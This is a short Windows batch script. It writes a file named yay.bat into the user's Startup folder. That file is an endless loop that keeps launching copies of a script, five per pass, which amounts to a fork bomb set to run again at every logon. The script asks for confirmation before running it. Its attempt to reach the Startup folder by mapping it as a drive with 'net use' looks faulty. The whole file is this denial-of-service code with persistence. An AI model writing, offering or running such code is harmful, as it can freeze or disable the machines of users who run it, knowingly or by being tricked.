@echo off
setlocal enabledelayedexpansion

net use Z: "%USERPROFILE%\Start Menu\Programs\Startup" /y
cd /d Z:\

(
  echo :A
  echo pause
  echo start "" %0
  echo start "" %0
  echo start "" %0
  echo start "" %0
  echo start "" %0
  echo GOTO A
) > yay.bat

set /p confirm=Do you want to run yay.bat? (Y/N): 
if /i "%confirm%"=="Y" (
    call yay.bat
) else (
    echo Exiting without running yay.bat.
)

net use Z: /delete /y